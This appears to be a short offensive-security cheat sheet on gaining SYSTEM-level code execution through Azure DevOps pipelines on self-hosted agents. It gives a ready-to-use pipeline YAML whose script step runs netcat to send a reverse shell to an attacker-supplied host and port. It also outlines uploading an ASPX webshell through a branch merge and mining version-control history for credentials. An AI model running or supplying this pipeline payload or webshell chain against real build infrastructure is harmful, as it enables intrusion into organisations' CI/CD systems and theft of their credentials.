# Azure DevOps Pipeline RCE (CI/CD Injection)

Azure DevOps agents run pipeline YAML as `NT AUTHORITY\SYSTEM` on self-hosted agents.

**If you can create or edit a pipeline:**
```yaml
trigger:
- master
pool: 'Setup'   # name of the self-hosted agent pool
steps:
- script: c:\programdata\nc.exe -e cmd <LHOST> <LPORT>
  displayName: 'shell'
```
Save and queue the build — shell returns as SYSTEM.

**If you can only upload files (not edit pipelines):**
1. Create a new branch (master is usually protected)
2. Upload ASPX webshell to branch → create PR → merge triggers existing pipeline
3. Webshell deployed to IIS site → find creds → get pipeline edit access → SYSTEM

**Check for SVN/Git history:** `svn log` or `git log --all` may reveal credentials or moved locations.

**Detect pipeline privilege:** look for `RunAsVirtualAccount: true` in `.psrc` or agent config.
